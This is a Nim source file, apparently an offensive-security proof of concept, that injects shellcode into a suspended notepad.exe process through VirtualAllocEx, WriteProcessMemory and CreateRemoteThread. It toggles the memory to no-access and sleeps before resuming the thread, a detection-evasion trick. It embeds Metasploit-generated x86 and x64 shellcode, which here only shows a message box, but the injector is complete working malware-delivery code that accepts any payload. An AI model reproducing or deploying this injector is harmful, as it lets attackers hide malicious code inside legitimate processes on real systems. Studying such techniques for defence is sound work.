#[
    Author: 2hangd
    License: BSD 3-Clause
]#

import winim/lean
import osproc
import os
proc Suspended_Thread_Injection[I, T](shellcode: array[I, T]): void =
    var op: DWORD
    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend() # That's handy!
    defer: tProcess.close()

    echo "[*] Target Process: ", tProcess.processID

    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](tProcess.processID)
    )
    defer: CloseHandle(pHandle)

    echo "[*] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    echo "[*] WriteProcessMemory: ", bool(wSuccess)
    echo "    \\-- bytes written: ", bytesWritten
    echo ""
    VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_NOACCESS,addr op)
    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](rPtr),
        NULL, 
        0x00000004, 
        NULL
    )
    sleep(10000)
    VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ_WRITE,addr op)
    ResumeThread(tHandle)
    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"

when defined(windows):

    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    when defined(i386):
        # ./msfvenom -p windows/messagebox -f csharp, then modified for Nim arrays
        echo "[*] Running in x86 process"
        var shellcode: array[272, byte] = [
        byte 0xd9,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64,0x8b,
        0x71,0x30,0x8b,0x76,0x0c,0x8b,0x76,0x1c,0x8b,0x46,0x08,0x8b,0x7e,0x20,0x8b,
        0x36,0x38,0x4f,0x18,0x75,0xf3,0x59,0x01,0xd1,0xff,0xe1,0x60,0x8b,0x6c,0x24,
        0x24,0x8b,0x45,0x3c,0x8b,0x54,0x28,0x78,0x01,0xea,0x8b,0x4a,0x18,0x8b,0x5a,
        0x20,0x01,0xeb,0xe3,0x34,0x49,0x8b,0x34,0x8b,0x01,0xee,0x31,0xff,0x31,0xc0,
        0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xcf,0x0d,0x01,0xc7,0xeb,0xf4,0x3b,0x7c,
        0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x01,0xeb,0x66,0x8b,0x0c,0x4b,0x8b,0x5a,
        0x1c,0x01,0xeb,0x8b,0x04,0x8b,0x01,0xe8,0x89,0x44,0x24,0x1c,0x61,0xc3,0xb2,
        0x08,0x29,0xd4,0x89,0xe5,0x89,0xc2,0x68,0x8e,0x4e,0x0e,0xec,0x52,0xe8,0x9f,
        0xff,0xff,0xff,0x89,0x45,0x04,0xbb,0x7e,0xd8,0xe2,0x73,0x87,0x1c,0x24,0x52,
        0xe8,0x8e,0xff,0xff,0xff,0x89,0x45,0x08,0x68,0x6c,0x6c,0x20,0x41,0x68,0x33,
        0x32,0x2e,0x64,0x68,0x75,0x73,0x65,0x72,0x30,0xdb,0x88,0x5c,0x24,0x0a,0x89,
        0xe6,0x56,0xff,0x55,0x04,0x89,0xc2,0x50,0xbb,0xa8,0xa2,0x4d,0xbc,0x87,0x1c,
        0x24,0x52,0xe8,0x5f,0xff,0xff,0xff,0x68,0x6f,0x78,0x58,0x20,0x68,0x61,0x67,
        0x65,0x42,0x68,0x4d,0x65,0x73,0x73,0x31,0xdb,0x88,0x5c,0x24,0x0a,0x89,0xe3,
        0x68,0x58,0x20,0x20,0x20,0x68,0x4d,0x53,0x46,0x21,0x68,0x72,0x6f,0x6d,0x20,
        0x68,0x6f,0x2c,0x20,0x66,0x68,0x48,0x65,0x6c,0x6c,0x31,0xc9,0x88,0x4c,0x24,
        0x10,0x89,0xe1,0x31,0xd2,0x52,0x53,0x51,0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,
        0x55,0x08]

    elif defined(amd64):
        # ./msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays
        echo "[*] Running in x64 process"
        var shellcode: array[295, byte] = [
        byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
        0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
        0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
        0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
        0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
        0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
        0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
        0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
        0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
        0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
        0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
        0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
        0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
        0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
        0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
        0x85,0x0f,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
        0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x48,0x65,0x6c,
        0x6c,0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,
        0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00]

    # This is essentially the equivalent of 'if __name__ == '__main__' in python
    when isMainModule:
        Suspended_Thread_Injection(shellcode)